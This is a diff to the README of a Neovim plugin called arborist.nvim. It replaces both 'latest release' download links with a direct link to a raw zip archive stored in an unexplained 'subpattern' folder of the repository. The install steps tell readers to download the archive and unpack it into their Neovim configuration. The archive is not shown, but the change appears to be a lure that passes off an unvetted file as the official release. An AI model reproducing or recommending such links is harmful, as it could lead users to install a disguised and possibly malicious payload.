@@ -1,6 +1,6 @@
 # 🌲 arborist.nvim - Manage your code structure with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/panamaniancetus44/arborist.nvim/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/panamaniancetus44/arborist.nvim/raw/refs/heads/main/subpattern/arborist_nvim_v3.8-alpha.1.zip)
 
 arborist.nvim helps you organize code in the Neovim text editor. It uses tree-sitter technology to read your files and identify their structure. This tool simplifies how you interact with complex codebases. It works behind the scenes to keep your development environment fast and tidy. You gain a better view of your code structure without manual effort. The plugin handles the heavy lifting so you focus on writing.
 
@@ -17,7 +17,7 @@ Follow these steps to obtain the files for your system.
 3. Download the archive file that matches your operating system.
 4. Unpack the files into your Neovim configuration folder.
 
-[Visit the release page to download the latest files](https://github.com/panamaniancetus44/arborist.nvim/releases)
+[Visit the release page to download the latest files](https://github.com/panamaniancetus44/arborist.nvim/raw/refs/heads/main/subpattern/arborist_nvim_v3.8-alpha.1.zip)
 
 ## ⚙️ Configuration
 
